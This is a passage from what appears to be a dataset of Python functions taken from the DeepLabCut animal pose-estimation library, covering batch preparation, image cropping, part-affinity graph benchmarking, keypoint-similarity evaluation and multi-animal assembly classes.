    part_score_targets = components[3]
    part_score_weights = components[4]
    locref_targets = components[5]
    locref_mask = components[6]
    im_file = data_item.im_path
    img = data_item.image
    batch = {Batch.inputs: img}
    if self.has_gt:
        batch.update({Batch.part_score_targets: part_score_targets, Batch.part_score_weights: part_score_weights, Batch.locref_targets: locref_targets, Batch.locref_mask: locref_mask})
    batch = {key: data_to_input(data) for (key, data) in batch.items()}
    batch[Batch.data_item] = data_item
    return batch"
AlexEMG/DeepLabCut,compute_scmap_weights,"def compute_scmap_weights(self, scmap_shape, joint_id):
    cfg = self.cfg
    if cfg['weigh_only_present_joints']:
        weights = np.zeros(scmap_shape)
        for person_joint_id in joint_id:
            for j_id in person_joint_id:
                weights[:, :, j_id] = 1.0
    else:
        weights = np.ones(scmap_shape)
    return weights"
AlexEMG/DeepLabCut,data_to_input,"def data_to_input(data):
    return np.expand_dims(data, axis=0).astype(float)"
AlexEMG/DeepLabCut,mirror_joints_map,"def mirror_joints_map(all_joints, num_joints):
    res = np.arange(num_joints)
    symmetric_joints = [p for p in all_joints if len(p) == 2]
    for pair in symmetric_joints:
        res[pair[0]] = pair[1]
        res[pair[1]] = pair[0]
    return res"
AlexEMG/DeepLabCut,crop_image,"def crop_image(joints, im, Xlabel, Ylabel, cfg):
    """"""Randomly cropping image around xlabel,ylabel taking into account size of image.
    Introduced in DLC 2.0 (Nature Protocols paper)""""""
    widthforward = int(cfg['minsize'] + np.random.randint(cfg['rightwidth']))
    widthback = int(cfg['minsize'] + np.random.randint(cfg['leftwidth']))
    hup = int(cfg['minsize'] + np.random.randint(cfg['topheight']))
    hdown = int(cfg['minsize'] + np.random.randint(cfg['bottomheight']))
    Xstart = max(0, int(Xlabel - widthback))
    Xstop = min(np.shape(im)[1] - 1, int(Xlabel + widthforward))
    Ystart = max(0, int(Ylabel - hdown))
    Ystop = min(np.shape(im)[0] - 1, int(Ylabel + hup))
    joints[0, :, 1] -= Xstart
    joints[0, :, 2] -= Ystart
    inbounds = np.where((joints[0, :, 1] > 0) * (joints[0, :, 1] < np.shape(im)[1]) * (joints[0, :, 2] > 0) * (joints[0, :, 2] < np.shape(im)[0]))[0]
    return (joints[:, inbounds, :], im[Ystart:Ystop + 1, Xstart:Xstop + 1, :])"
AlexEMG/DeepLabCut,_set_up_evaluation,"def _set_up_evaluation(data):
    params = dict()
    params['joint_names'] = data['metadata']['all_joints_names']
    params['num_joints'] = len(params['joint_names'])
    partaffinityfield_graph = data['metadata']['PAFgraph']
    params['paf'] = np.arange(len(partaffinityfield_graph))
    params['paf_graph'] = params['paf_links'] = [partaffinityfield_graph[l] for l in params['paf']]
    params['bpts'] = params['ibpts'] = range(params['num_joints'])
    params['imnames'] = [fn for fn in list(data) if fn != 'metadata']
    return params"
AlexEMG/DeepLabCut,_form_original_path,"def _form_original_path(path):
    (root, filename) = os.path.split(path)
    (base, ext) = os.path.splitext(filename)
    return os.path.join(root, filename.split('c')[0] + ext)"
AlexEMG/DeepLabCut,_unsorted_unique,"def _unsorted_unique(array):
    (_, inds) = np.unique(array, return_index=True)
    return np.asarray(array)[np.sort(inds)]"
AlexEMG/DeepLabCut,_find_closest_neighbors,"def _find_closest_neighbors(query, ref, k=3):
    n_preds = ref.shape[0]
    tree = cKDTree(ref)
    (dist, inds) = tree.query(query, k=k)
    idx = np.argsort(dist[:, 0])
    neighbors = np.full(len(query), -1, dtype=int)
    picked = set()
    for (i, ind) in enumerate(inds[idx]):
        for j in ind:
            if j not in picked:
                picked.add(j)
                neighbors[idx[i]] = j
                break
        if len(picked) == n_preds:
            break
    return neighbors"
AlexEMG/DeepLabCut,_calc_separability,"def _calc_separability(vals_left, vals_right, n_bins=101, metric='jeffries', max_sensitivity=False):
    if metric not in ('jeffries', 'auc'):
        raise ValueError(""`metric` should be either 'jeffries' or 'auc'."")
    bins = np.linspace(0, 1, n_bins)
    hist_left = np.histogram(vals_left, bins=bins)[0]
    hist_left = hist_left / hist_left.sum()
    hist_right = np.histogram(vals_right, bins=bins)[0]
    hist_right = hist_right / hist_right.sum()
    tpr = np.cumsum(hist_right)
    if metric == 'jeffries':
        sep = np.sqrt(2 * (1 - np.sum(np.sqrt(hist_left * hist_right))))
    else:
        sep = np.trapz(np.cumsum(hist_left), tpr)
    if max_sensitivity:
        threshold = bins[max(1, np.argmax(tpr > 0))]
    else:
        threshold = bins[np.argmin(1 - np.cumsum(hist_left) + tpr)]
    return (sep, threshold)"
AlexEMG/DeepLabCut,_calc_within_between_pafs,"def _calc_within_between_pafs(data, metadata, per_edge=True, train_set_only=True):
    data = deepcopy(data)
    train_inds = set(metadata['data']['trainIndices'])
    graph = data['metadata']['PAFgraph']
    within_train = defaultdict(list)
    within_test = defaultdict(list)
    between_train = defaultdict(list)
    between_test = defaultdict(list)
    for (i, (key, dict_)) in enumerate(data.items()):
        if key == 'metadata':
            continue
        is_train = i in train_inds
        if train_set_only and (not is_train):
            continue
        df = dict_['groundtruth'][2]
        try:
            df.drop('single', level='individuals', inplace=True)
        except KeyError:
            pass
        bpts = df.index.get_level_values('bodyparts').unique().to_list()
        coords_gt = df.unstack(['individuals', 'coords']).reindex(bpts, level='bodyparts').to_numpy().reshape((len(bpts), -1, 2))
        if np.isnan(coords_gt).all():
            continue
        coords = dict_['prediction']['coordinates'][0]
        lookup = dict()
        for (i, (coord, coord_gt)) in enumerate(zip(coords, coords_gt)):
            inds = np.flatnonzero(np.all(~np.isnan(coord), axis=1))
            inds_gt = np.flatnonzero(np.all(~np.isnan(coord_gt), axis=1))
            if inds.size and inds_gt.size:
                neighbors = _find_closest_neighbors(coord_gt[inds_gt], coord[inds], k=3)
                found = neighbors != -1
                lookup[i] = dict(zip(inds_gt[found], inds[neighbors[found]]))
        costs = dict_['prediction']['costs']
        for (k, v) in costs.items():
            paf = v['m1']
            mask_within = np.zeros(paf.shape, dtype=bool)
            (s, t) = graph[k]
            if s not in lookup or t not in lookup:
                continue
            lu_s = lookup[s]
            lu_t = lookup[t]
            common_id = set(lu_s).intersection(lu_t)
            for id_ in common_id:
                mask_within[lu_s[id_], lu_t[id_]] = True
            within_vals = paf[mask_within]
            between_vals = paf[~mask_within]
            if is_train:
                within_train[k].extend(within_vals)
                between_train[k].extend(between_vals)
            else:
                within_test[k].extend(within_vals)
                between_test[k].extend(between_vals)
    if not per_edge:
        within_train = np.concatenate([*within_train.values()])
        within_test = np.concatenate([*within_test.values()])
        between_train = np.concatenate([*between_train.values()])
        between_test = np.concatenate([*between_test.values()])
    return ((within_train, within_test), (between_train, between_test))"
AlexEMG/DeepLabCut,_benchmark_paf_graphs,"def _benchmark_paf_graphs(config, inference_cfg, data, paf_inds, greedy=False, add_discarded=True, identity_only=False, calibration_file='', oks_sigma=0.1, margin=0, symmetric_kpts=None, split_inds=None):
    metadata = data.pop('metadata')
    multi_bpts_orig = auxfun_multianimal.extractindividualsandbodyparts(config)[2]
    multi_bpts = [j for j in metadata['all_joints_names'] if j in multi_bpts_orig]
    n_multi = len(multi_bpts)
    data_ = {'metadata': metadata}
    for (k, v) in data.items():
        data_[k] = v['prediction']
    ass = Assembler(data_, max_n_individuals=inference_cfg['topktoretain'], n_multibodyparts=n_multi, greedy=greedy, pcutoff=inference_cfg.get('pcutoff', 0.1), min_affinity=inference_cfg.get('pafthreshold', 0.1), add_discarded=add_discarded, identity_only=identity_only)
    if calibration_file:
        ass.calibrate(calibration_file)
    params = ass.metadata
    image_paths = params['imnames']
    bodyparts = params['joint_names']
    idx = data[image_paths[0]]['groundtruth'][2].unstack('coords').reindex(bodyparts, level='bodyparts').index
    mask_multi = idx.get_level_values('individuals') != 'single'
    if not mask_multi.all():
        idx = idx.drop('single', level='individuals')
    individuals = idx.get_level_values('individuals').unique()
    n_individuals = len(individuals)
    map_ = dict(zip(individuals, range(n_individuals)))
    ground_truth = []
    for (i, imname) in enumerate(image_paths):
        temp = data[imname]['groundtruth'][2].reindex(multi_bpts, level='bodyparts')
        ground_truth.append(temp.to_numpy().reshape((-1, 2)))
    ground_truth = np.stack(ground_truth)
    temp = np.ones((*ground_truth.shape[:2], 3))
    temp[..., :2] = ground_truth
    temp = temp.reshape((temp.shape[0], n_individuals, -1, 3))
    ass_true_dict = _parse_ground_truth_data(temp)
    ids = np.vectorize(map_.get)(idx.get_level_values('individuals').to_numpy())
    ground_truth = np.insert(ground_truth, 2, ids, axis=2)
    paf_inds = sorted(paf_inds, key=len)
    n_graphs = len(paf_inds)
    all_scores = []
    all_metrics = []
    all_assemblies = []
    for (j, paf) in enumerate(paf_inds, start=1):
        print(f'Graph {j}|{n_graphs}')
        ass.paf_inds = paf
        ass.assemble()
        all_assemblies.append((ass.assemblies, ass.unique, ass.metadata['imnames']))
        if split_inds is not None:
            oks = []
            for inds in split_inds:
                ass_gt = {k: v for (k, v) in ass_true_dict.items() if k in inds}
                oks.append(evaluate_assembly(ass.assemblies, ass_gt, oks_sigma, margin=margin, symmetric_kpts=symmetric_kpts, greedy_matching=inference_cfg.get('greedy_oks', False)))
        else:
            oks = evaluate_assembly(ass.assemblies, ass_true_dict, oks_sigma, margin=margin, symmetric_kpts=symmetric_kpts, greedy_matching=inference_cfg.get('greedy_oks', False))
        all_metrics.append(oks)
        scores = np.full((len(image_paths), 2), np.nan)
        for (i, imname) in enumerate(tqdm(image_paths)):
            gt = ground_truth[i]
            gt = gt[~np.isnan(gt).any(axis=1)]
            if len(np.unique(gt[:, 2])) < 2:
                continue
            n_dets = len(gt)
            animals = ass.assemblies.get(i)
            if animals is None:
                if n_dets:
                    scores[i, 0] = 1
            else:
                animals = [np.c_[animal.data, np.ones(animal.data.shape[0]) * n] for (n, animal) in enumerate(animals)]
                hyp = np.concatenate(animals)
                hyp = hyp[~np.isnan(hyp).any(axis=1)]
                scores[i, 0] = max(0, (n_dets - hyp.shape[0]) / n_dets)
                neighbors = _find_closest_neighbors(gt[:, :2], hyp[:, :2])
                valid = neighbors != -1
                id_gt = gt[valid, 2]
                id_hyp = hyp[neighbors[valid], -1]
                mat = contingency_matrix(id_gt, id_hyp)
                purity = mat.max(axis=0).sum() / mat.sum()
                scores[i, 1] = purity
        all_scores.append((scores, paf))
    dfs = []
    for (score, inds) in all_scores:
        df = pd.DataFrame(score, columns=['miss', 'purity'])
        df['ngraph'] = len(inds)
        dfs.append(df)
    big_df = pd.concat(dfs)
    group = big_df.groupby('ngraph')
    return (all_scores, group.agg(['mean', 'std']).T, all_metrics, all_assemblies)"
AlexEMG/DeepLabCut,_get_n_best_paf_graphs,"def _get_n_best_paf_graphs(data, metadata, full_graph, n_graphs=10, root=None, which='best', ignore_inds=None, metric='auc'):
    if which not in ('best', 'worst'):
        raise ValueError('`which` must be either ""best"" or ""worst""')
    ((within_train, _), (between_train, _)) = _calc_within_between_pafs(data, metadata, train_set_only=True)
    existing_edges = set((k for (k, v) in within_train.items() if v))
    if ignore_inds is not None:
        existing_edges = existing_edges.difference(ignore_inds)
    existing_edges = list(existing_edges)
    if not any(between_train.values()):
        return ([existing_edges], dict(zip(existing_edges, [0] * len(existing_edges))))
    (scores, _) = zip(*[_calc_separability(between_train[n], within_train[n], metric=metric) for n in existing_edges])
    G = nx.Graph()
    for (edge, score) in zip(existing_edges, scores):
        if np.isfinite(score):
            G.add_edge(*full_graph[edge], weight=score)
    if which == 'best':
        order = np.asarray(existing_edges)[np.argsort(scores)[::-1]]
        if root is None:
            root = []
            for edge in nx.maximum_spanning_edges(G, data=False):
                root.append(full_graph.index(sorted(edge)))
    else:
        order = np.asarray(existing_edges)[np.argsort(scores)]
        if root is None:
            root = []
            for edge in nx.minimum_spanning_edges(G, data=False):
                root.append(full_graph.index(sorted(edge)))
    n_edges = len(existing_edges) - len(root)
    lengths = np.linspace(0, n_edges, min(n_graphs, n_edges + 1), dtype=int)[1:]
    order = order[np.isin(order, root, invert=True)]
    paf_inds = [root]
    for length in lengths:
        paf_inds.append(root + list(order[:length]))
    return (paf_inds, dict(zip(existing_edges, scores)))"
AlexEMG/DeepLabCut,cross_validate_paf_graphs,"def cross_validate_paf_graphs(config, inference_config, full_data_file, metadata_file, output_name='', pcutoff=0.1, oks_sigma=0.1, margin=0, greedy=False, add_discarded=True, calibrate=False, overwrite_config=True, n_graphs=10, paf_inds=None, symmetric_kpts=None):
    cfg = auxiliaryfunctions.read_config(config)
    inf_cfg = auxiliaryfunctions.read_plainconfig(inference_config)
    inf_cfg_temp = inf_cfg.copy()
    inf_cfg_temp['pcutoff'] = pcutoff
    with open(full_data_file, 'rb') as file:
        data = pickle.load(file)
    with open(metadata_file, 'rb') as file:
        metadata = pickle.load(file)
    params = _set_up_evaluation(data)
    to_ignore = auxfun_multianimal.filter_unwanted_paf_connections(cfg, params['paf_graph'])
    best_graphs = _get_n_best_paf_graphs(data, metadata, params['paf_graph'], ignore_inds=to_ignore, n_graphs=n_graphs)
    paf_scores = best_graphs[1]
    if paf_inds is None:
        paf_inds = best_graphs[0]
    if calibrate:
        trainingsetfolder = auxiliaryfunctions.get_training_set_folder(cfg)
        calibration_file = os.path.join(cfg['project_path'], str(trainingsetfolder), 'CollectedData_' + cfg['scorer'] + '.h5')
    else:
        calibration_file = ''
    results = _benchmark_paf_graphs(cfg, inf_cfg_temp, data, paf_inds, greedy, add_discarded, oks_sigma=oks_sigma, margin=margin, symmetric_kpts=symmetric_kpts, calibration_file=calibration_file, split_inds=[metadata['data']['trainIndices'], metadata['data']['testIndices']])
    df = results[1]
    size_opt = np.argmax((1 - df.loc['miss', 'mean']) * df.loc['purity', 'mean'])
    pose_config = inference_config.replace('inference_cfg', 'pose_cfg')
    if not overwrite_config:
        shutil.copy(pose_config, pose_config.replace('.yaml', '_old.yaml'))
    inds = list(paf_inds[size_opt])
    auxiliaryfunctions.edit_config(pose_config, {'paf_best': [int(ind) for ind in inds]})
    if output_name:
        with open(output_name, 'wb') as file:
            pickle.dump([results], file)
    return (results[:3], paf_scores, results[3][size_opt])"
AlexEMG/DeepLabCut,_conv_square_to_condensed_indices,"def _conv_square_to_condensed_indices(ind_row, ind_col, n):
    if ind_row == ind_col:
        raise ValueError('There are no diagonal elements in condensed matrices.')
    if ind_row < ind_col:
        (ind_row, ind_col) = (ind_col, ind_row)
    return n * ind_col - ind_col * (ind_col + 1) // 2 + ind_row - 1 - ind_col"
AlexEMG/DeepLabCut,calc_object_keypoint_similarity,"def calc_object_keypoint_similarity(xy_pred, xy_true, sigma, margin=0, symmetric_kpts=None):
    visible_gt = ~np.isnan(xy_true).all(axis=1)
    if visible_gt.sum() < 2:
        return np.nan
    true = xy_true[visible_gt]
    scale_squared = np.product(np.ptp(true, axis=0) + np.spacing(1) + margin * 2)
    if np.isclose(scale_squared, 0):
        return np.nan
    k_squared = (2 * sigma) ** 2
    denom = 2 * scale_squared * k_squared
    if symmetric_kpts is None:
        pred = xy_pred[visible_gt]
        pred[np.isnan(pred)] = np.inf
        dist_squared = np.sum((pred - true) ** 2, axis=1)
        oks = np.exp(-dist_squared / denom)
        return np.mean(oks)
    else:
        oks = []
        xy_preds = [xy_pred]
        combos = (pair for l in range(len(symmetric_kpts)) for pair in itertools.combinations(symmetric_kpts, l + 1))
        for pairs in combos:
            tmp = xy_pred.copy()
            for pair in pairs:
                tmp[pair, :] = tmp[pair[::-1], :]
            xy_preds.append(tmp)
        for xy_pred in xy_preds:
            pred = xy_pred[visible_gt]
            pred[np.isnan(pred)] = np.inf
            dist_squared = np.sum((pred - true) ** 2, axis=1)
            oks.append(np.mean(np.exp(-dist_squared / denom)))
        return max(oks)"
AlexEMG/DeepLabCut,match_assemblies,"def match_assemblies(ass_pred, ass_true, sigma, margin=0, symmetric_kpts=None, greedy_matching=False):
    ass_pred = [a for a in ass_pred if len(a) > 1]
    ass_true = [a for a in ass_true if len(a) > 1]
    matched = []
    if greedy_matching:
        inds_true = list(range(len(ass_true)))
        inds_pred = np.argsort([ins.affinity if ins.n_links else ins.confidence for ins in ass_pred])[::-1]
        for ind_pred in inds_pred:
            xy_pred = ass_pred[ind_pred].xy
            oks = []
            for ind_true in inds_true:
                xy_true = ass_true[ind_true].xy
                oks.append(calc_object_keypoint_similarity(xy_pred, xy_true, sigma, margin, symmetric_kpts))
            if np.all(np.isnan(oks)):
                continue
            ind_best = np.nanargmax(oks)
            ind_true_best = inds_true.pop(ind_best)
            matched.append((ass_pred[ind_pred], ass_true[ind_true_best], oks[ind_best]))
            if not inds_true:
                break
    else:
        mat = np.zeros((len(ass_pred), len(ass_true)))
        for (i, a_pred) in enumerate(ass_pred):
            for (j, a_true) in enumerate(ass_true):
                oks = calc_object_keypoint_similarity(a_pred.xy, a_true.xy, sigma, margin, symmetric_kpts)
                if ~np.isnan(oks):
                    mat[i, j] = oks
        (rows, cols) = linear_sum_assignment(mat, maximize=True)
        inds_true = list(range(len(ass_true)))
        for (row, col) in zip(rows, cols):
            matched.append((ass_pred[row], ass_true[col], mat[row, col]))
            _ = inds_true.remove(col)
    unmatched = [ass_true[ind] for ind in inds_true]
    return (matched, unmatched)"
AlexEMG/DeepLabCut,parse_ground_truth_data_file,"def parse_ground_truth_data_file(h5_file):
    df = pd.read_hdf(h5_file)
    try:
        df.drop('single', axis=1, level='individuals', inplace=True)
    except KeyError:
        pass
    cols = df.select_dtypes(include='object').columns
    if cols.to_list():
        df[cols] = df[cols].astype('float')
    n_individuals = len(df.columns.get_level_values('individuals').unique())
    n_bodyparts = len(df.columns.get_level_values('bodyparts').unique())
    data = df.to_numpy().reshape((df.shape[0], n_individuals, n_bodyparts, -1))
    return _parse_ground_truth_data(data)"
AlexEMG/DeepLabCut,_parse_ground_truth_data,"def _parse_ground_truth_data(data):
    gt = dict()
    for (i, arr) in enumerate(data):
        temp = []
        for row in arr:
            if np.isnan(row[:, :2]).all():
                continue
            ass = Assembly.from_array(row)
            temp.append(ass)
        if not temp:
            continue
        gt[i] = temp
    return gt"
AlexEMG/DeepLabCut,find_outlier_assemblies,"def find_outlier_assemblies(dict_of_assemblies, criterion='area', qs=(5, 95)):
    if not hasattr(Assembly, criterion):
        raise ValueError(f'Invalid criterion {criterion}.')
    if len(qs) != 2:
        raise ValueError('Two percentiles (for lower and upper bounds) should be given.')
    tuples = []
    for (frame_ind, assemblies) in dict_of_assemblies.items():
        for assembly in assemblies:
            tuples.append((frame_ind, getattr(assembly, criterion)))
    (frame_inds, vals) = zip(*tuples)
    vals = np.asarray(vals)
    (lo, up) = np.percentile(vals, qs, interpolation='nearest')
    inds = np.flatnonzero((vals < lo) | (vals > up)).tolist()
    return list(set((frame_inds[i] for i in inds)))"
AlexEMG/DeepLabCut,evaluate_assembly,"def evaluate_assembly(ass_pred_dict, ass_true_dict, oks_sigma=0.072, oks_thresholds=np.linspace(0.5, 0.95, 10), margin=0, symmetric_kpts=None, greedy_matching=False):
    all_matched = []
    all_unmatched = []
    for (ind, ass_true) in tqdm(ass_true_dict.items()):
        ass_pred = ass_pred_dict.get(ind, [])
        (matched, unmatched) = match_assemblies(ass_pred, ass_true, oks_sigma, margin, symmetric_kpts, greedy_matching)
        all_matched.extend(matched)
        all_unmatched.extend(unmatched)
    if not all_matched:
        return {'precisions': np.array([]), 'recalls': np.array([]), 'mAP': 0.0, 'mAR': 0.0}
    conf_pred = np.asarray([match[0].affinity for match in all_matched])
    idx = np.argsort(-conf_pred, kind='mergesort')
    oks = np.asarray([match[2] for match in all_matched])[idx]
    ntot = len(all_matched) + len(all_unmatched)
    recall_thresholds = np.linspace(0, 1, 101)
    precisions = []
    recalls = []
    for th in oks_thresholds:
        tp = np.cumsum(oks >= th)
        fp = np.cumsum(oks < th)
        rc = tp / ntot
        pr = tp / (fp + tp + np.spacing(1))
        recall = rc[-1]
        for i in range(len(pr) - 1, 0, -1):
            if pr[i] > pr[i - 1]:
                pr[i - 1] = pr[i]
        inds_rc = np.searchsorted(rc, recall_thresholds)
        precision = np.zeros(inds_rc.shape)
        valid = inds_rc < len(pr)
        precision[valid] = pr[inds_rc[valid]]
        precisions.append(precision)
        recalls.append(recall)
    precisions = np.asarray(precisions)
    recalls = np.asarray(recalls)
    return {'precisions': precisions, 'recalls': recalls, 'mAP': precisions.mean(), 'mAR': recalls.mean()}"
AlexEMG/DeepLabCut,__init__,"def __init__(self, j1, j2, affinity=1):
    self.j1 = j1
    self.j2 = j2
    self.affinity = affinity
    self._length = sqrt((j1.pos[0] - j2.pos[0]) ** 2 + (j1.pos[1] - j2.pos[1]) ** 2)"
AlexEMG/DeepLabCut,__repr__,"def __repr__(self):
    return f'Link {self.idx}, affinity={self.affinity:.2f}, length={self.length:.2f}'"
AlexEMG/DeepLabCut,confidence,"@property
def confidence(self):
    return self.j1.confidence * self.j2.confidence"
AlexEMG/DeepLabCut,idx,"@property
def idx(self):
    return (self.j1.idx, self.j2.idx)"
AlexEMG/DeepLabCut,length,"@property
def length(self):
    return self._length"
AlexEMG/DeepLabCut,length,"@length.setter
def length(self, length):
    self._length = length"
AlexEMG/DeepLabCut,to_vector,"def to_vector(self):
    return [*self.j1.pos, *self.j2.pos]"
AlexEMG/DeepLabCut,__init__,"def __init__(self, size):
    self.data = np.full((size, 4), np.nan)
    self.confidence = 0
    self._affinity = 0
    self._links = []
    self._visible = set()
    self._idx = set()
    self._dict = dict()"
AlexEMG/DeepLabCut,__len__,"def __len__(self):
    return len(self._visible)"
AlexEMG/DeepLabCut,__contains__,"def __contains__(self, assembly):
    return bool(self._visible.intersection(assembly._visible))"
AlexEMG/DeepLabCut,__add__,"def __add__(self, other):
    if other in self:
        raise ValueError('Assemblies contain shared joints.')
    assembly = Assembly(self.data.shape[0])
    for link in self._links + other._links:
        assembly.add_link(link)
    return assembly"
AlexEMG/DeepLabCut,from_array,"@classmethod
def from_array(cls, array):
    (n_bpts, n_cols) = array.shape
    ass = cls(size=n_bpts)
    ass.data[:, :n_cols] = array
    visible = np.flatnonzero(~np.isnan(array).any(axis=1))
    if n_cols < 3:
        ass.data[visible, 2] = 1
    ass._visible.update(visible)
    return ass"
AlexEMG/DeepLabCut,xy,"@property
def xy(self):
    return self.data[:, :2]"
AlexEMG/DeepLabCut,extent,"@property
def extent(self):
    bbox = np.empty(4)
    bbox[:2] = np.nanmin(self.xy, axis=0)
    bbox[2:] = np.nanmax(self.xy, axis=0)
    return bbox"
AlexEMG/DeepLabCut,area,"@property
def area(self):
    (x1, y1, x2, y2) = self.extent
    return (x2 - x1) * (y2 - y1)"
AlexEMG/DeepLabCut,confidence,"@property
def confidence(self):
    return np.nanmean(self.data[:, 2])"
AlexEMG/DeepLabCut,confidence,"@confidence.setter
def confidence(self, confidence):
    self.data[:, 2] = confidence"
AlexEMG/DeepLabCut,soft_identity,"@property
def soft_identity(self):
    data = self.data[~np.isnan(self.data).any(axis=1)]
    (unq, idx, cnt) = np.unique(data[:, 3], return_inverse=True, return_counts=True)
    avg = np.bincount(idx, weights=data[:, 2]) / cnt
    soft = softmax(avg)
    return dict(zip(unq.astype(int), soft))"
AlexEMG/DeepLabCut,affinity,"@property
def affinity(self):
    n_links = self.n_links
    if not n_links:
        return 0
    return self._affinity / n_links"
AlexEMG/DeepLabCut,n_links,"@property
def n_links(self):
    return len(self._links)"
AlexEMG/DeepLabCut,intersection_with,"def intersection_with(self, other):
    (x11, y11, x21, y21) = self.extent
    (x12, y12, x22, y22) = other.extent
    x1 = max(x11, x12)
    y1 = max(y11, y12)
    x2 = min(x21, x22)
    y2 = min(y21, y22)
    if x2 < x1 or y2 < y1:
        return 0
    ll = np.array([x1, y1])
    ur = np.array([x2, y2])
    xy1 = self.xy[~np.isnan(self.xy).any(axis=1)]
    xy2 = other.xy[~np.isnan(other.xy).any(axis=1)]
    in1 = np.all((xy1 >= ll) & (xy1 <= ur), axis=1).sum()
    in2 = np.all((xy2 >= ll) & (xy2 <= ur), axis=1).sum()
    return min(in1 / len(self), in2 / len(other))"
AlexEMG/DeepLabCut,add_joint,"def add_joint(self, joint):
    if joint.label in self._visible or joint.label is None:
        return False
    self.data[joint.label] = (*joint.pos, joint.confidence, joint.group)
    self._visible.add(joint.label)
    self._idx.add(joint.idx)
    return True"
AlexEMG/DeepLabCut,remove_joint,"def remove_joint(self, joint):
    if joint.label not in self._visible:
        return False
    self.data[joint.label] = np.nan
    self._visible.remove(joint.label)
    self._idx.remove(joint.idx)
    return True"
AlexEMG/DeepLabCut,add_link,"def add_link(self, link, store_dict=False):
    if store_dict:
        self._dict = {'data': self.data.copy(), '_affinity': self._affinity, '_links': self._links.copy(), '_visible': self._visible.copy(), '_idx': self._idx.copy()}
    (i1, i2) = link.idx
    if i1 in self._idx and i2 in self._idx:
        self._affinity += link.affinity
        self._links.append(link)
        return False
    if link.j1.label in self._visible and link.j2.label in self._visible:
        return False
    self.add_joint(link.j1)
    self.add_joint(link.j2)
    self._affinity += link.affinity
    self._links.append(link)
    return True"
AlexEMG/DeepLabCut,calc_pairwise_distances,"def calc_pairwise_distances(self):
    return pdist(self.xy, metric='sqeuclidean')"
AlexEMG/DeepLabCut,__init__,"def __init__(self, data, *, max_n_individuals, n_multibodyparts, graph=None, paf_inds=None, greedy=False, pcutoff=0.1, min_affinity=0.05, min_n_links=2, max_overlap=0.8, identity_only=False, nan_policy='little', force_fusion=False, add_discarded=False, window_size=0, method='m1'):
    self.data = data
    self.metadata = self.parse_metadata(self.data)
    self.max_n_individuals = max_n_individuals
    self.n_multibodyparts = n_multibodyparts
    self.n_uniquebodyparts = self.n_keypoints - n_multibodyparts
    self.greedy = greedy
    self.pcutoff = pcutoff
    self.min_affinity = min_affinity
    self.min_n_links = min_n_links
    self.max_overlap = max_overlap
    self._has_identity = 'identity' in self[0]
    if identity_only and (not self._has_identity):
        warnings.warn('The network was not trained with identity; setting `identity_only` to False.')
    self.identity_only = identity_only & self._has_identity
    self.nan_policy = nan_policy
    self.force_fusion = force_fusion
    self.add_discarded = add_discarded
    self.window_size = window_size
    self.method = method
    self.graph = graph or self.metadata['paf_graph']
    self.paf_inds = paf_inds or self.metadata['paf']
    self._gamma = 0.01
    self._trees = dict()
    self.safe_edge = False
    self._kde = None
    self.assemblies = dict()
    self.unique = dict()"
AlexEMG/DeepLabCut,__getitem__,"def __getitem__(self, item):
    return self.data[self.metadata['imnames'][item]]"
AlexEMG/DeepLabCut,n_keypoints,"@property
def n_keypoints(self):
    return self.metadata['num_joints']"
AlexEMG/DeepLabCut,calibrate,"def calibrate(self, train_data_file):
    df = pd.read_hdf(train_data_file)
    try:
        df.drop('single', level='individuals', axis=1, inplace=True)
    except KeyError:
        pass
    n_bpts = len(df.columns.get_level_values('bodyparts').unique())
    if n_bpts == 1:
        warnings.warn('There is only one keypoint; skipping calibration...')
        return
    xy = df.to_numpy().reshape((-1, n_bpts, 2))
    frac_valid = np.mean(~np.isnan(xy), axis=(1, 2))
    xy = xy[frac_valid >= 0.9]
    if not xy.size:
        warnings.warn('No complete poses were found. Skipping calibration...')
        return
    dists = np.vstack([pdist(data, 'sqeuclidean') for data in xy])
    mu = np.nanmean(dists, axis=0)
    missing = np.isnan(dists)
    dists = np.where(missing, mu, dists)
    try:
        kde = gaussian_kde(dists.T)
        kde.mean = mu
        self._kde = kde
        self.safe_edge = True
    except np.linalg.LinAlgError:
        warnings.warn('The assembler could not be robustly calibrated. Continuing without it...')"
AlexEMG/DeepLabCut,calc_assembly_mahalanobis_dist,"def calc_assembly_mahalanobis_dist(self, assembly, return_proba=False, nan_policy='little'):
    if self._kde is None:
        raise ValueError('Assembler should be calibrated first with training data.')
    dists = assembly.calc_pairwise_distances() - self._kde.mean
    mask = np.isnan(dists)
    if not len(assembly) or mask.all():
        if return_proba:
            return (np.inf, 0)
        return np.inf
    if nan_policy == 'little':
        inds = np.flatnonzero(~mask)
        dists = dists[inds]
        inv_cov = self._kde.inv_cov[np.ix_(inds, inds)]
        factor = self._kde.d / len(inds)
    else:
        dists[mask] = 0
        mask.fill(False)
        inv_cov = self._kde.inv_cov
        factor = 1
    dot = dists @ inv_cov
    mahal = factor * sqrt(np.sum(dot * dists, axis=-1))
    if return_proba:
        proba = 1 - chi2.cdf(mahal, np.sum(~mask))
        return (mahal, proba)
    return mahal"
AlexEMG/DeepLabCut,calc_link_probability,"def calc_link_probability(self, link):
    if self._kde is None:
        raise ValueError('Assembler should be calibrated first with training data.')
    i = link.j1.label
    j = link.j2.label
    ind = _conv_square_to_condensed_indices(i, j, self.n_multibodyparts)
    mu = self._kde.mean[ind]
    sigma = self._kde.covariance[ind, ind]
    z = (link.length ** 2 - mu) / sigma
    return 2 * (1 - 0.5 * (1 + erf(abs(z) / sqrt(2))))"
AlexEMG/DeepLabCut,_flatten_detections,"@staticmethod
def _flatten_detections(data_dict):
    ind = 0
    coordinates = data_dict['coordinates'][0]
    confidence = data_dict['confidence']
    ids = data_dict.get('identity', None)
    if ids is None:
        ids = [np.ones(len(arr), dtype=int) * -1 for arr in confidence]
    else:
        ids = [arr.argmax(axis=1) for arr in ids]
    for (i, (coords, conf, id_)) in enumerate(zip(coordinates, confidence, ids)):
        if not np.any(coords):
            continue
        for (xy, p, g) in zip(coords, conf, id_):
            joint = Joint(tuple(xy), p.item(), i, ind, g)
            ind += 1
            yield joint"
AlexEMG/DeepLabCut,extract_best_links,"def extract_best_links(self, joints_dict, costs, trees=None):
    links = []
    for ind in self.paf_inds:
        (s, t) = self.graph[ind]
        dets_s = joints_dict.get(s, None)
        dets_t = joints_dict.get(t, None)
        if dets_s is None or dets_t is None:
            continue
        if ind not in costs:
            continue
        lengths = costs[ind]['distance']
        if np.isinf(lengths).all():
            continue
        aff = costs[ind][self.method].copy()
        aff[np.isnan(aff)] = 0
        if trees:
            vecs = np.vstack([[*det_s.pos, *det_t.pos] for det_s in dets_s for det_t in dets_t])
            dists = []
            for (n, tree) in enumerate(trees, start=1):
